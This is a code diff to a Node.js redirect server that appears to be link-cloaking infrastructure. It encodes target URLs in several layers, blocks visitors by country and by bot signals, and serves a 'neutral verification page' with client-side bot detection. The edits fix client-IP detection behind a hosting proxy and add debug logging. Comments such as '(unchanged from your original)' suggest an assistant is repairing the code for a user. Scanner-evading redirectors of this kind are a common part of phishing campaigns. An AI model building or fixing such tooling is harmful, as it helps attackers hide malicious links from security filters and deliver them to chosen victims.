@@ -112,17 +112,39 @@ function isLikelyBot(req) {
 }
 
 // ────────────────────────────────────────────────
-// GEO LOCATION CHECK
+// GEO LOCATION CHECK – FIXED FOR RENDER PROXY
 // ────────────────────────────────────────────────
 async function getCountryCode(req) {
-  if (req.headers['cf-ipcountry']) return req.headers['cf-ipcountry'].toUpperCase();
+  // Prioritize real client IP from proxy headers
+  let forwarded = req.headers['x-forwarded-for'];
+  let ip = forwarded ? forwarded.split(',')[0].trim() :
+           req.headers['x-real-ip'] ||
+           req.ip ||
+           'unknown';
 
-  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
-  if (ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('::1')) return 'XX';
+  console.log(`[DEBUG-IP] Raw req.ip=${req.ip} | x-forwarded-for=${forwarded || 'missing'} | Chosen IP=${ip}`);
+
+  // Skip lookup for localhost / private / reserved ranges
+  if (ip === 'unknown' ||
+      ip.startsWith('127.') || ip.startsWith('::1') ||
+      ip.startsWith('10.') ||
+      (ip.startsWith('172.') && parseInt(ip.split('.')[1], 10) >= 16 && parseInt(ip.split('.')[1], 10) <= 31) ||
+      ip.startsWith('192.168.')) {
+    console.log(`[DEBUG-GEO] Private/reserved/internal IP detected (${ip}), returning XX`);
+    return 'XX';
+  }
 
   try {
-    const res = await fetch(GEO_API_URL.replace('{ip}', ip), { timeout: 3000 });
-    if (res.ok) return (await res.text()).trim().toUpperCase();
+    const url = GEO_API_URL.replace('{ip}', ip);
+    console.log(`[DEBUG-GEO] Querying ${url}`);
+    const res = await fetch(url, { timeout: 3000 });
+    if (res.ok) {
+      const cc = (await res.text()).trim().toUpperCase();
+      console.log(`[GEO SUCCESS] IP=${ip} → Country=${cc}`);
+      return cc || 'XX';
+    } else {
+      console.log(`[GEO FAIL] HTTP ${res.status} for IP=${ip}`);
+    }
   } catch (err) {
     console.log(`[GEO FAIL] ${ip} | ${err.message}`);
   }
@@ -131,6 +153,7 @@ async function getCountryCode(req) {
 
 // ────────────────────────────────────────────────
 // MULTI-LAYER URL ENCODING / DECODING
+// (unchanged from your original)
 // ────────────────────────────────────────────────
 const encoders = [
   { name: 'base64',     enc: s => Buffer.from(s).toString('base64'),     dec: s => Buffer.from(s, 'base64').toString() },
@@ -182,6 +205,7 @@ function multiLayerDecode(encoded, layers, noise) {
 
 // ────────────────────────────────────────────────
 // GENERATE TRACKING LINK
+// (unchanged)
 // ────────────────────────────────────────────────
 app.get('/generate', (req, res) => {
   const target = req.query.target || TARGET_URL;
@@ -224,6 +248,8 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   if (ALLOWED_COUNTRIES.length) geoAllowed = ALLOWED_COUNTRIES.includes(country);
   if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;
 
+  console.log(`[DEBUG-GEO-CHECK] Country=${country} | Allowed=${geoAllowed} | Bot=${isLikelyBot(req)}`);
+
   if (!geoAllowed || isLikelyBot(req)) {
     const reason = !geoAllowed ? 'GEO_BLOCKED' : 'BOT_BLOCK';
     fs.appendFile(LOG_FILE, `${new Date().toISOString()} ${reason} ${ip} ${country}\n`, () => {});
@@ -262,6 +288,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
   // ────────────────────────────────────────────────
   // NEUTRAL VERIFICATION PAGE + AGGRESSIVE CLIENT-SIDE BOT DETECTION
+  // (unchanged from your original)
   // ────────────────────────────────────────────────
   res.send(`
 <!DOCTYPE html>
